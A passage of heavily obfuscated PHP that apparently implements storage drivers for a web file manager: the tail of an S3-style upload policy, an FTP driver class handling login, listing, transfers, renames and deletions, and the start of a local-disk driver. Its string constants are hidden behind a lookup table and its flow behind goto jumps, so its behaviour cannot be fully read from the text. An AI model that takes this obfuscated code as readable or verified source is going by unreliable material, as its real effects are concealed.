b­Æ´¤ò; b­Æ´¤ò: $DíÚ‹ÕŒ = array($this->accessKey, $f“Âç‹Ëò, $this->region, $f¯Ÿäˆ§, $b’µ³Ç­Ÿ¬); $C–Òˆ„İ†¶ = implode($BÓÈõœîÕ[8], $DíÚ‹ÕŒ); $DÊËæÓç®Ø = array($BÓÈõœîÕ[1115] => gmdate($BÓÈõœîÕ[1114], strtotime($BÓÈõœîÕ[1150])), $BÓÈõœîÕ[1116] => array(array($BÓÈõœîÕ[1118] => $this->bucket), array($BÓÈõœîÕ[1117] => $B·£¢ÊÖÕ), array($BÓÈõœîÕ[1119], $BÓÈõœîÕ[1120], $BÓÈõœîÕ[33]), array($BÓÈõœîÕ[1119], $BÓÈõœîÕ[1151], $BÓÈõœîÕ[33]), array($BÓÈõœîÕ[1119], $BÓÈõœîÕ[1152], $BÓÈõœîÕ[33]), array($BÓÈõœîÕ[1121] => $E¼ê‰Üøàˆ), array($BÓÈõœîÕ[1153] => $C–Òˆ„İ†¶), array($BÓÈõœîÕ[1154] => $AÕë«®¦öÃ), array($BÓÈõœîÕ[1155] => $FÁÇšŸ«), array($BÓÈõœîÕ[1156] => $c¯—ÁäÙ¡º))); goto F§¡ñ´ç; fö¹áîæ·: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($EËÍô´Î½Æ) { parent::__construct(); if (count($EËÍô´Î½Æ) > 0) { $this->_init($EËÍô´Î½Æ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($d³ê‡·™¿) { $A²÷áË±ŞÊ =& $_SERVER[¬ˆÚÂ”Éğä]; global $config; $this->appCharset = $config[$A²÷áË±ŞÊ[1165]]; $this->systemCharset = $config[$A²÷áË±ŞÊ[1166]]; if (isset($d³ê‡·™¿[$A²÷áË±ŞÊ[1167]]) && $d³ê‡·™¿[$A²÷áË±ŞÊ[1167]]) { $this->systemCharset = $d³ê‡·™¿[$A²÷áË±ŞÊ[1167]]; } } public function iconvApp($B‘à·Á×³¾) { return $this->iconvTo($B‘à·Á×³¾, $this->systemCharset, $this->appCharset); } public function iconvSystem($aŸª‡‚¶áƒ) { return $this->iconvTo($aŸª‡‚¶áƒ, $this->appCharset, $this->systemCharset); } public function getPathOuter($BÑÑ©Ø) { goto dƒ¶Êƒğ—‘; aˆÇ®ÀµœË: if (substr($Fö¼èØò½İ, 0, 2) == $E¦Ô«Í…ìŠ[1168]) { $Fö¼èØò½İ = BASIC_PATH . substr($Fö¼èØò½İ, 2); } if (substr($BÑÑ©Ø, 0, 2) == $E¦Ô«Í…ìŠ[1168]) { $BÑÑ©Ø = BASIC_PATH . substr($BÑÑ©Ø, 2); } $Fö¼èØò½İ = KodIO::clear($Fö¼èØò½İ); goto fÌÇôÉŠ‹; dƒ¶Êƒğ—‘: $E¦Ô«Í…ìŠ =& $_SERVER[¬ˆÚÂ”Éğä]; $Fö¼èØò½İ = $this->iconvApp($this->pathBase); $BÑÑ©Ø = $this->iconvApp($BÑÑ©Ø); goto aˆÇ®ÀµœË; fÌÇôÉŠ‹: $BÑÑ©Ø = KodIO::clear($BÑÑ©Ø); $BÑÑ©Ø = substr($BÑÑ©Ø, strlen($Fö¼èØò½İ)); if (empty($this->pathDriver)) { return $BÑÑ©Ø; } goto Dœ²¼›Ö¹ô; Dœ²¼›Ö¹ô: return $this->pathDriver . $E¦Ô«Í…ìŠ[8] . ltrim($BÑÑ©Ø, $E¦Ô«Í…ìŠ[8]); goto A·İÎÜĞßÒ; A·İÎÜĞßÒ: } private function _init($BÂÂ¯–îÈİ = array()) { $BÀ¾²ñ¡ÂÎ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!function_exists($BÀ¾²ñ¡ÂÎ[1169])) { show_json(LNG($BÀ¾²ñ¡ÂÎ[1170]), !1); } $this->config = $BÂÂ¯–îÈİ; $this->charsetReset($BÂÂ¯–îÈİ); foreach ($BÂÂ¯–îÈİ as $f…çºœœÑí => $F¬ÖÎ£ö£„) { if (isset($this->{$f…çºœœÑí})) { $this->{$f…çºœœÑí} = $F¬ÖÎ£ö£„; } } return $this->_login($BÂÂ¯–îÈİ); } private function _login($f…Æ½Ô˜—ù) { goto déÂ÷’›Ê; déÂ÷’›Ê: $CèáÎä– ÷ =& $_SERVER[¬ˆÚÂ”Éğä]; static $D¥±÷‘§¯ = array(); $e°§Šá’ÇÒ = md5(json_encode($f…Æ½Ô˜—ù)); goto c™Í‡ø·ËÜ; aµÑ±˜´„Ê: $D–íãŞ’ÁÎ = isset($DÑƒóÏøà´[$CèáÎä– ÷[168]]) && $DÑƒóÏøà´[$CèáÎä– ÷[168]] == $CèáÎä– ÷[1171] ? !0 : !1; $this->scheme = $D–íãŞ’ÁÎ ? $CèáÎä– ÷[1172] : $CèáÎä– ÷[1173]; $this->port = isset($DÑƒóÏøà´[$CèáÎä– ÷[170]]) ? $DÑƒóÏøà´[$CèáÎä– ÷[170]] : 21; goto böæ‹µÄ’ò; böæ‹µÄ’ò: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $C¨±¶—Ü£¿ = @ftp_login($this->connect, $this->username, $this->userpass); goto fœºÆÅî†; c™Í‡ø·ËÜ: if (isset($D¥±÷‘§¯[$e°§Šá’ÇÒ])) { foreach ($D¥±÷‘§¯[$e°§Šá’ÇÒ] as $CĞø†¬… => $aí‡â†èéª) { $this->{$CĞø†¬…} = $aí‡â†èéª; } return !0; } $DÑƒóÏøà´ = parse_url(trim($this->server, $CèáÎä– ÷[8])); $this->host = $DÑƒóÏøà´[$CèáÎä– ÷[169]]; goto aµÑ±˜´„Ê; f†ˆõ‰­Ê†: $D¥±÷‘§¯[$e°§Šá’ÇÒ] = array($CèáÎä– ÷[1174] => $this->connect, $CèáÎä– ÷[169] => $this->host, $CèáÎä– ÷[168] => $this->scheme, $CèáÎä– ÷[170] => $this->port); return $C¨±¶—Ü£¿; goto e§†÷šÏëî; fœºÆÅî†: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $fß•ÁæĞ§Ä = $this->pasv == $CèáÎä– ÷[83] ? !0 : !1; @ftp_pasv($this->connect, $fß•ÁæĞ§Ä); goto f†ˆõ‰­Ê†; e§†÷šÏëî: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($Aù³ëŸ•ÎÜ, $F¡Œ´‹ßó = '', $C·ì¼‡²À¾ = REPEAT_RENAME) { if ($this->setContent($Aù³ëŸ•ÎÜ, $F¡Œ´‹ßó)) { return $this->getPathOuter($Aù³ëŸ•ÎÜ); } return !1; } public function mkdir($E“íàå½, $F§«æøªŸ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $E“íàå½ = $this->iconvSystem($E“íàå½); if ($this->isFolder($E“íàå½) || @ftp_mkdir($this->connect, $E“íàå½)) { return $this->getPathOuter($E“íàå½); } if (!$this->mkdir($this->pathFather($E“íàå½))) { return !1; } if ($E“íàå½ = @ftp_mkdir($this->connect, $E“íàå½)) { return $this->getPathOuter($E“íàå½); } return !1; } public function copyFile($dí¤ëô—Å, $dàÇ–±÷³») { goto F•ŒŠÂ”×‰; eŸ«íÄ» : $this->tempFileRemve($dó‰„™£õ­); return $d‡Ò³šòÆÒ; goto DçÖÔÉ¾Şì; EéõÀ†¹ˆ¤: $Eéô ÷··Ò = $this->iconvApp($dó‰„™£õ­); $this->download($dí¤ëô—Å, $Eéô ÷··Ò); $d‡Ò³šòÆÒ = $this->upload($dàÇ–±÷³», $Eéô ÷··Ò); goto eŸ«íÄ» ; F•ŒŠÂ”×‰: if (!$this->_isconn()) { return !1; } $f »«‰ë‚ = $this->pathThis($this->iconvSystem($dí¤ëô—Å)); $dó‰„™£õ­ = $this->tempFile($f »«‰ë‚); goto EéõÀ†¹ˆ¤; DçÖÔÉ¾Şì: } public function moveFile($fß³¤áŒê, $FÃ³ç —Í) { if (!$this->_isconn()) { return !1; } $fß³¤áŒê = $this->iconvSystem($fß³¤áŒê); $FÃ³ç —Í = $this->iconvSystem($FÃ³ç —Í); $bŒ‡¹Šã¦… = @ftp_rename($this->connect, $fß³¤áŒê, $FÃ³ç —Í); return $bŒ‡¹Šã¦… ? $this->getPathOuter($FÃ³ç —Í) : !1; } public function delFile($C¼¡ƒ½‡÷) { if (!$this->_isconn()) { return !1; } $C¼¡ƒ½‡÷ = $this->iconvSystem($C¼¡ƒ½‡÷); return @ftp_delete($this->connect, $C¼¡ƒ½‡÷); } public function delFolder($bŞãô¿Šƒ) { if (!$this->_isconn()) { return !1; } $bŞãô¿Šƒ = $this->iconvSystem($bŞãô¿Šƒ); $E‰ùÊì«°Ã = $this->ftpList($bŞãô¿Šƒ); if (!$E‰ùÊì«°Ã) { return @ftp_rmdir($this->connect, $bŞãô¿Šƒ); } foreach ($E‰ùÊì«°Ã as $fğÂÄØç·Â) { if ($this->isFolder($fğÂÄØç·Â)) { $fğÂÄØç·Â = $this->iconvApp($fğÂÄØç·Â); $this->delFolder($fğÂÄØç·Â); } else { @ftp_delete($this->connect, $fğÂÄØç·Â); } } return @ftp_rmdir($this->connect, $bŞãô¿Šƒ); } public function rename($f†³“Ø¢÷, $cäÙ°›ÁÊ) { goto C‚ŒğöŠ; cé¤Ê©¾ø: return $C ¥Æ§È˜… ? $this->getPathOuter($A•áœîÛËÉ) : !1; goto DäÅ´ê¯; C‚ŒğöŠ: $A´æ˜ÙîäÅ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->_isconn()) { return !1; } $d¿¨½‘­Çê = $this->fileNameAuto($this->pathFather($f†³“Ø¢÷), $cäÙ°›ÁÊ); goto FÛÑÀÜí×ˆ; EÚ–Ğ¼ÏËÇ: $A•áœîÛËÉ = rtrim($cªÎ¾İÉ…, $A´æ˜ÙîäÅ[8]) . $A´æ˜ÙîäÅ[8] . $d¿¨½‘­Çê; $C ¥Æ§È˜… = @ftp_rename($this->connect, $f†³“Ø¢÷, $A•áœîÛËÉ); $A•áœîÛËÉ = $this->iconvApp($A•áœîÛËÉ); goto cé¤Ê©¾ø; FÛÑÀÜí×ˆ: $d¿¨½‘­Çê = $this->iconvSystem($d¿¨½‘­Çê); $f†³“Ø¢÷ = $this->iconvSystem($f†³“Ø¢÷); $cªÎ¾İÉ… = $this->pathFather($f†³“Ø¢÷); goto EÚ–Ğ¼ÏËÇ; DäÅ´ê¯: } private function folderInfo($eÜ¶¡¯‚×‚, $cÑÍñ´¸¶ = false) { goto f½•›½§Íğ; f½•›½§Íğ: $A¡©®‘‰„Å =& $_SERVER[¬ˆÚÂ”Éğä]; $c×²š½‰Õ­ = $this->getPathOuter(rtrim($eÜ¶¡¯‚×‚, $A¡©®‘‰„Å[8])); $EîœĞÄ³¼¦ = $this->pathThis($c×²š½‰Õ­); goto Cª¦õÍ±ñí; Cª¦õÍ±ñí: $BòÀô¦®  = $this->iconvSystem($eÜ¶¡¯‚×‚); if ($cÑÍñ´¸¶) { return array($A¡©®‘‰„Å[28] => $EîœĞÄ³¼¦, $A¡©®‘‰„Å[75] => $c×²š½‰Õ­, $A¡©®‘‰„Å[29] => $A¡©®‘‰„Å[76]); } $E£™Çâˆ¹¿ = array($A¡©®‘‰„Å[28] => $EîœĞÄ³¼¦, $A¡©®‘‰„Å[75] => $c×²š½‰Õ­, $A¡©®‘‰„Å[29] => $A¡©®‘‰„Å[76], $A¡©®‘‰„Å[187] => 0, $A¡©®‘‰„Å[107] => 0, $A¡©®‘‰„Å[1175] => !0, $A¡©®‘‰„Å[1176] => !0); goto E™«°Â¶Š‚; E™«°Â¶Š‚: return $E£™Çâˆ¹¿; goto f‘áÅ¥Ä“ê; f‘áÅ¥Ä“ê: } private function fileInfo($f‰‰Óõ–å, $aî£¥“×¬Å = false) { goto E¹¼¬ˆÏ·; E¹¼¬ˆÏ·: $dšÂÇÊ‚ =& $_SERVER[¬ˆÚÂ”Éğä]; $DóÉ³œÂ¦Œ = $this->getPathOuter(rtrim($f‰‰Óõ–å, $dšÂÇÊ‚[8])); $e‘ÜƒÂˆ¸• = $this->pathThis($DóÉ³œÂ¦Œ); goto cŒ•Íù“·; cŒ•Íù“·: $cÜÃÅ©ğÒŞ = $this->iconvSystem($f‰‰Óõ–å); if ($aî£¥“×¬Å) { return array($dšÂÇÊ‚[28] => $e‘ÜƒÂˆ¸•, $dšÂÇÊ‚[75] => $DóÉ³œÂ¦Œ, $dšÂÇÊ‚[29] => $dšÂÇÊ‚[167], $dšÂÇÊ‚[160] => $this->ext($f‰‰Óõ–å), $dšÂÇÊ‚[77] => $this->size($f‰‰Óõ–å)); } $A©õ¡ìø‰¡ = array($dšÂÇÊ‚[28] => $e‘ÜƒÂˆ¸•, $dšÂÇÊ‚[75] => $DóÉ³œÂ¦Œ, $dšÂÇÊ‚[29] => $dšÂÇÊ‚[167], $dšÂÇÊ‚[187] => 0, $dšÂÇÊ‚[107] => @ftp_mdtm($this->connect, $cÜÃÅ©ğÒŞ), $dšÂÇÊ‚[160] => $this->ext($f‰‰Óõ–å), $dšÂÇÊ‚[77] => $this->size($f‰‰Óõ–å), $dšÂÇÊ‚[1175] => !0, $dšÂÇÊ‚[1176] => !0); goto eø†ÑÆÄ¥; eø†ÑÆÄ¥: $A©õ¡ìø‰¡[$dšÂÇÊ‚[107]] = $A©õ¡ìø‰¡[$dšÂÇÊ‚[107]] > 0 ? $A©õ¡ìø‰¡[$dšÂÇÊ‚[107]] : 0; return $A©õ¡ìø‰¡; goto a»Ùß±…¤à; a»Ùß±…¤à: } public function size($AÔŸŠµ†•) { $F‰áç‰äáª = $this->objectMeta($AÔŸŠµ†•); return $F‰áç‰äáª ? $F‰áç‰äáª[$_SERVER[¬ˆÚÂ”Éğä][77]] : 0; } public function info($Eé¨´óéî¹) { if ($this->isFile($Eé¨´óéî¹)) { return $this->fileInfo($Eé¨´óéî¹, 0); } else { if ($this->isFolder($Eé¨´óéî¹)) { return $this->folderInfo($Eé¨´óéî¹); } } return !1; } public function exist($D¤šİòÖ) { return $this->objectMeta($D¤šİòÖ) ? !0 : !1; } public function isFile($C¬ÜÜË´§·) { $fÀ ¬õºÒ° =& $_SERVER[¬ˆÚÂ”Éğä]; $Bˆ·ˆé…‡ = $this->objectMeta($C¬ÜÜË´§·); return $Bˆ·ˆé…‡ ? $Bˆ·ˆé…‡[$fÀ ¬õºÒ°[29]] == $fÀ ¬õºÒ°[167] : !1; } public function isFolder($AÊĞ’··Ìå) { $C§¨®¦Ô =& $_SERVER[¬ˆÚÂ”Éğä]; $EæšÈó‘ = $this->objectMeta($AÊĞ’··Ìå); return $EæšÈó‘ ? $EæšÈó‘[$C§¨®¦Ô[29]] == $C§¨®¦Ô[76] : !1; } public function listPath($b¢‘Ì˜Œ¸¡, $Bæ¶çâ© = false) { goto DÂ¤¡çÜ“Ã; DÂ¤¡çÜ“Ã: $cƒâ…¹ ‚© =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->_isconn()) { return !1; } $b¢‘Ì˜Œ¸¡ = $this->iconvSystem($b¢‘Ì˜Œ¸¡); goto A»å ä‘öè; dÙí°ÉÉñ‘: foreach ($a…µî „æ as $b¢‘Ì˜Œ¸¡) { if ($this->isFolder($b¢‘Ì˜Œ¸¡)) { $cÍ ›îõ[$cƒâ…¹ ‚©[74]][] = $this->folderInfo($b¢‘Ì˜Œ¸¡, $Bæ¶çâ©); } else { $cÍ ›îõ[$cƒâ…¹ ‚©[73]][] = $this->fileInfo($b¢‘Ì˜Œ¸¡, $Bæ¶çâ©); } } return $cÍ ›îõ; goto bØéÁèÕ¯; A»å ä‘öè: $a…µî „æ = $this->ftpList($b¢‘Ì˜Œ¸¡); $cÍ ›îõ = array($cƒâ…¹ ‚©[74] => array(), $cƒâ…¹ ‚©[73] => array()); if (!$a…µî „æ) { return $cÍ ›îõ; } goto dÙí°ÉÉñ‘; bØéÁèÕ¯: } public function has($CêºÒ˜Ü¦Â, $eŠäµ·°Ö = false, $Cƒ·ÇÆ—á = true) { goto d¿’Ñ Ö‡; d—ÅĞ‰·Í¢: foreach ($Aå´²¨ï¦Ê as $CêºÒ˜Ü¦Â) { if ($Cƒ·ÇÆ—á) { if (!$this->isFolder($CêºÒ˜Ü¦Â)) { return !0; } } else { if ($this->isFolder($CêºÒ˜Ü¦Â)) { return !0; } } } return !1; goto C«Ìï¬®¸; d¿’Ñ Ö‡: $aÂ²²¨ÓÄÚ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->_isconn()) { return !1; } $CêºÒ˜Ü¦Â = $this->iconvSystem($CêºÒ˜Ü¦Â); goto eªÙ·Ñ«õÏ; eªÙ·Ñ«õÏ: $Aå´²¨ï¦Ê = $this->ftpList($CêºÒ˜Ü¦Â); if (!$Aå´²¨ï¦Ê) { return !1; } if ($eŠäµ·°Ö) { return array($aÂ²²¨ÓÄÚ[191] => 0, $aÂ²²¨ÓÄÚ[192] => count($Aå´²¨ï¦Ê)); } goto d—ÅĞ‰·Í¢; C«Ìï¬®¸: } public function listAll($d†Ø÷Ëœª) { goto Bª‘»áùò®; eĞ‘áİÌˆ¢: foreach ($C¾ï§Äøê»[$D°µ¹¨²®—[74]] as $AŒÅîòÖ¿) { $aÌ½£æĞ¸Ö[] = array($D°µ¹¨²®—[75] => $D°µ¹¨²®—[8] . trim(str_replace($d†Ø÷Ëœª, $D°µ¹¨²®—[33], $AŒÅîòÖ¿), $D°µ¹¨²®—[8]) . $D°µ¹¨²®—[8], $D°µ¹¨²®—[76] => 1, $D°µ¹¨²®—[77] => 0); } foreach ($C¾ï§Äøê»[$D°µ¹¨²®—[73]] as $EÊŞÀÉ„ º) { $aÌ½£æĞ¸Ö[] = array($D°µ¹¨²®—[75] => $D°µ¹¨²®—[8] . trim(str_replace($d†Ø÷Ëœª, $D°µ¹¨²®—[33], $EÊŞÀÉ„ º), $D°µ¹¨²®—[8]), $D°µ¹¨²®—[76] => 0, $D°µ¹¨²®—[77] => $this->size($EÊŞÀÉ„ º)); } return $aÌ½£æĞ¸Ö; goto F„Ï”Ã¾¤; Bª‘»áùò®: $D°µ¹¨²®— =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->_isconn()) { return !1; } $d†Ø÷Ëœª = $this->iconvSystem($d†Ø÷Ëœª); goto aƒñãÃéğ‰; aƒñãÃéğ‰: $C¾ï§Äøê» = array($D°µ¹¨²®—[73] => array(), $D°µ¹¨²®—[74] => array()); $this->recursionFtpFiles($d†Ø÷Ëœª, $C¾ï§Äøê»); $aÌ½£æĞ¸Ö = array(); goto eĞ‘áİÌˆ¢; F„Ï”Ã¾¤: } public function getContent($a…¸¾“••¸) { if (!$this->_isconn()) { return !1; } $a…¸¾“••¸ = $this->iconvSystem($a…¸¾“••¸); return $this->fileSubstr($a…¸¾“••¸); } public function setContent($B«¦Äêà˜â, $D¹ª’›†µ = '') { goto A¬İÏ‘†”İ; e·ÈÜá´ÜÜ: file_put_contents($aš´È´ºÀŞ, $D¹ª’›†µ); $a¼ç ¡×­ = $this->upload($B«¦Äêà˜â, $this->iconvApp($aš´È´ºÀŞ)); $this->tempFileRemve($aš´È´ºÀŞ); goto dŒ½‚¶Ü˜ß; A¬İÏ‘†”İ: if (!$this->_isconn()) { return !1; } $cì¼ª÷Œ¾‡ = $this->pathThis($this->iconvSystem($B«¦Äêà˜â)); $aš´È´ºÀŞ = $this->tempFile($cì¼ª÷Œ¾‡); goto e·ÈÜá´ÜÜ; dŒ½‚¶Ü˜ß: return $a¼ç ¡×­; goto eÁ¥õŠ”Ç¹; eÁ¥õŠ”Ç¹: } public function fileSubstr($cÈ–Ûãê¿­, $F­ëñ–‘ÓÛ = 0, $F‰ô˜­¥Ú§ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($cÈ–Ûãê¿­, $F­ëñ–‘ÓÛ, $F‰ô˜­¥Ú§); } private function ftpRequest($DëŒìòò²í, $f×ÆØÏÑ„ = 0, $a„â¼â›Ë¶ = false) { goto f½¢¹ïšÜ‘; fù‹­ï±ñ: return $bÕÎù¢¨¦; goto dŞ–Ãšù¬Ó; Fƒ°ôÚêØ: curl_setopt($BëÃš¦ÛÀ·, CURLOPT_URL, $cìø®Ş©Úá . $this->pathEncode($DëŒìòò²í)); curl_setopt($BëÃš¦ÛÀ·, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($a„â¼â›Ë¶) { $Eè¸Ï¥ô•š = $f×ÆØÏÑ„ + $a„â¼â›Ë¶ - 1; curl_setopt($BëÃš¦ÛÀ·, CURLOPT_RANGE, "{$f×ÆØÏÑ„}\x2d{$Eè¸Ï¥ô•š}"); } goto dâÙÅ¦Å; f½¢¹ïšÜ‘: $DëŒìòò²í = $this->iconvSystem($DëŒìòò²í); $cìø®Ş©Úá = $this->scheme . $this->host . $_SERVER[¬ˆÚÂ”Éğä][4] . $this->port; $BëÃš¦ÛÀ· = curl_init(); goto Fƒ°ôÚêØ; dâÙÅ¦Å: curl_setopt($BëÃš¦ÛÀ·, CURLOPT_RETURNTRANSFER, 1); $bÕÎù¢¨¦ = curl_exec($BëÃš¦ÛÀ·); curl_close($BëÃš¦ÛÀ·); goto fù‹­ï±ñ; dŞ–Ãšù¬Ó: } public function upload($f•ùî›á„‚, $CİÀø‰ˆ¬Î, $Cãµâ¦œœÙ = false, $b¬ßÖãîäÈ = REPEAT_REPLACE) { goto e‡îä»Ù»¾; e‡îä»Ù»¾: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($f•ùî›á„‚))) { return !1; } $f•ùî›á„‚ = $this->iconvSystem($f•ùî›á„‚); goto bô°Âõˆõ’; bô°Âõˆõ’: $CİÀø‰ˆ¬Î = $this->iconvSystem($CİÀø‰ˆ¬Î); $d†ÓÁ¾†Ö = ftp_nb_put($this->connect, $f•ùî›á„‚, $CİÀø‰ˆ¬Î, FTP_BINARY); while ($d†ÓÁ¾†Ö == FTP_MOREDATA) { $d†ÓÁ¾†Ö = ftp_nb_continue($this->connect); } goto C¹ÃÕ‘²Û; C¹ÃÕ‘²Û: if ($d†ÓÁ¾†Ö != FTP_FINISHED) { return !1; } return $this->getPathOuter($f•ùî›á„‚); goto cÛØÚ´îŒ; cÛØÚ´îŒ: } public function download($cÚãùˆğ, $eÅƒö´»·Ñ = '') { goto e¬íç½‘ÁÙ; e¬íç½‘ÁÙ: if (!$this->_isconn()) { return !1; } $Dœ¦ëË…Ş = $this->pathFather($eÅƒö´»·Ñ); if (!IO::mkdir($Dœ¦ëË…Ş)) { return !1; } goto E²á¶¸äœï; E²á¶¸äœï: $cÚãùˆğ = $this->iconvSystem($cÚãùˆğ); $eÅƒö´»·Ñ = $this->iconvSystem($eÅƒö´»·Ñ); $E¬¾¦™³Ø = ftp_nb_get($this->connect, $eÅƒö´»·Ñ, $cÚãùˆğ, FTP_BINARY); goto B¯èØ±é; B¯èØ±é: while ($E¬¾¦™³Ø == FTP_MOREDATA) { $E¬¾¦™³Ø = ftp_nb_continue($this->connect); } if ($E¬¾¦™³Ø != FTP_FINISHED) { return !1; } return $this->iconvApp($eÅƒö´»·Ñ); goto Dî«èó»‹‡; Dî«èó»‹‡: } private function ftpList($Fœƒ’ß™) { goto F½÷¼‹òŸÈ; Dğã³Ø¢†­: $Fœƒ’ß™ = rtrim($Fœƒ’ß™, $C§à—ñˆÖë[8]) . $C§à—ñˆÖë[8]; $a˜Ûå¢ÅÁ = @ftp_nlist($this->connect, $Fœƒ’ß™); if ($a˜Ûå¢ÅÁ === !1) { $a˜Ûå¢ÅÁ = @ftp_rawlist($this->connect, $Fœƒ’ß™); foreach ($a˜Ûå¢ÅÁ as $Eñåø¢Â¸í => $cé¢– À·ò) { $a˜Ûå¢ÅÁ[$Eñåø¢Â¸í] = end(explode($C§à—ñˆÖë[1177], $cé¢– À·ò)); } } goto FŒÀÓ¬³†£; FŒÀÓ¬³†£: $a˜Ûå¢ÅÁ = array_diff($a˜Ûå¢ÅÁ, array($C§à—ñˆÖë[91], $C§à—ñˆÖë[1178], $Fœƒ’ß™ . $C§à—ñˆÖë[91], $Fœƒ’ß™ . $C§à—ñˆÖë[1178])); $eŒª‚Ş—˜ = array(); foreach ($a˜Ûå¢ÅÁ as $D á„É¶Ì±) { if (!strstr($D á„É¶Ì±, $C§à—ñˆÖë[8])) { $D á„É¶Ì± = $Fœƒ’ß™ . ltrim($D á„É¶Ì±, $C§à—ñˆÖë[8]); } $eŒª‚Ş—˜[] = $this->iconvApp($D á„É¶Ì±); } goto e±Ş¡Œ„…; F½÷¼‹òŸÈ: $C§à—ñˆÖë =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->isFolder($Fœƒ’ß™)) { return !1; } @ftp_chdir($this->connect, $C§à—ñˆÖë[8]); goto Dğã³Ø¢†­; e±Ş¡Œ„…: return $eŒª‚Ş—˜; goto cç›ç²²¢ê; cç›ç²²¢ê: } private function recursionFtpFiles($e‰âÙ¸ƒù‰, &$fåÓ¯‡Æê) { $dÍùšÓµçë =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->_isconn()) { return !1; } if (!($fæèˆ„Ê‡É = $this->ftpList($e‰âÙ¸ƒù‰))) { return !1; } foreach ($fæèˆ„Ê‡É as $e‰âÙ¸ƒù‰) { if ($this->isFolder($e‰âÙ¸ƒù‰)) { $this->recursionFtpFiles($e‰âÙ¸ƒù‰, $fåÓ¯‡Æê); $fåÓ¯‡Æê[$dÍùšÓµçë[74]][] = $e‰âÙ¸ƒù‰; } else { $fåÓ¯‡Æê[$dÍùšÓµçë[73]][] = $e‰âÙ¸ƒù‰; } } } private function objectMeta($d÷ôçÄ¾â) { goto D¹¼¤Êæó; C­µ¼É‹‚: if ($dĞŒäØßë¦ !== null && $dĞŒäØßë¦ !== !1) { return $dĞŒäØßë¦; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $bµ×ùÎ¡Ñ‘[8]); goto B¸Şí°†; B¸Şí°†: $aŞñ›ç‚ = @ftp_size($this->connect, $this->iconvSystem($d÷ôçÄ¾â)); if ($aŞñ›ç‚ != -1) { $dĞŒäØßë¦ = array($bµ×ùÎ¡Ñ‘[77] => $aŞñ›ç‚, $bµ×ùÎ¡Ñ‘[29] => $bµ×ùÎ¡Ñ‘[167]); } else { $dˆ†Ä¬›ŒÏ = @ftp_chdir($this->connect, $this->iconvSystem($d÷ôçÄ¾â)); $dĞŒäØßë¦ = $dˆ†Ä¬›ŒÏ ? array($bµ×ùÎ¡Ñ‘[77] => 0, $bµ×ùÎ¡Ñ‘[29] => $bµ×ùÎ¡Ñ‘[76]) : !1; } Cache::set($d Œ––°Í, $dĞŒäØßë¦, 0); goto eíĞ¤ºÌî‘; eíĞ¤ºÌî‘: return $dĞŒäØßë¦; goto B…„ì’‘ ; D¹¼¤Êæó: $bµ×ùÎ¡Ñ‘ =& $_SERVER[¬ˆÚÂ”Éğä]; $d Œ––°Í = $bµ×ùÎ¡Ñ‘[1179] . md5($d÷ôçÄ¾â); $dĞŒäØßë¦ = Cache::get($d Œ––°Í); goto C­µ¼É‹‚; B…„ì’‘ : } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($FÍ­á°±ğŒ) { if (substr($FÍ­á°±ğŒ, 0, 2) == $_SERVER[¬ˆÚÂ”Éğä][1168]) { $FÍ­á°±ğŒ = BASIC_PATH . substr($FÍ­á°±ğŒ, 2); } return $FÍ­á°±ğŒ; } public function iconvApp($AóÛˆíğº¥) { $AòôìÂİ– =& $_SERVER[¬ˆÚÂ”Éğä]; global $config; return $this->iconvTo($AóÛˆíğº¥, $config[$AòôìÂİ–[1166]], $config[$AòôìÂİ–[1165]]); } public function iconvSystem($e‡Òğì¦™¹) { $bâÒÆŒùİŠ =& $_SERVER[¬ˆÚÂ”Éğä]; global $config; return $this->iconvTo($e‡Òğì¦™¹, $config[$bâÒÆŒùİŠ[1165]], $config[$bâÒÆŒùİŠ[1166]]); } public function getPathOuter($c÷…«»–èä) { goto f¯´ÜÏ¦ëœ; f¯´ÜÏ¦ëœ: $dÒ»Ö¡š‹ =& $_SERVER[¬ˆÚÂ”Éğä]; $fŠ¡Ùíá = $this->iconvApp($this->pathBase); $c÷…«»–èä = $this->iconvApp($c÷…«»–èä); goto eˆ¼«ğÀ˜Ÿ; CîÁŠä ÈÎ: return $this->pathDriver . $dÒ»Ö¡š‹[8] . ltrim($c÷…«»–èä, $dÒ»Ö¡š‹[8]); goto B°ÑÂÊÀëŒ; eˆ¼«ğÀ˜Ÿ: if (substr($fŠ¡Ùíá, 0, 2) == $dÒ»Ö¡š‹[1168]) { $fŠ¡Ùíá = BASIC_PATH . substr($fŠ¡Ùíá, 2); } if (substr($c÷…«»–èä, 0, 2) == $dÒ»Ö¡š‹[1168]) { $c÷…«»–èä = BASIC_PATH . substr($c÷…«»–èä, 2); } $fŠ¡Ùíá = KodIO::clear($fŠ¡Ùíá); goto DõêÊ’øÂ×; DõêÊ’øÂ×: $c÷…«»–èä = KodIO::clear($c÷…«»–èä); $c÷…«»–èä = substr($c÷…«»–èä, strlen($fŠ¡Ùíá)); if (empty($this->pathDriver)) { return $c÷…«»–èä; } goto CîÁŠä ÈÎ; B°ÑÂÊÀëŒ: } public function mkfile($c¨Ò³ß Ùƒ, $b‚âÇ¨ÍÙÒ = '', $EåÕ¨­äÒ¬ = REPEAT_RENAME) { $c¨Ò³ß Ùƒ = $this->iconvSystem($c¨Ò³ß Ùƒ); @touch($c¨Ò³ß Ùƒ); if ($b‚âÇ¨ÍÙÒ) { file_put_contents($c¨Ò³ß Ùƒ, 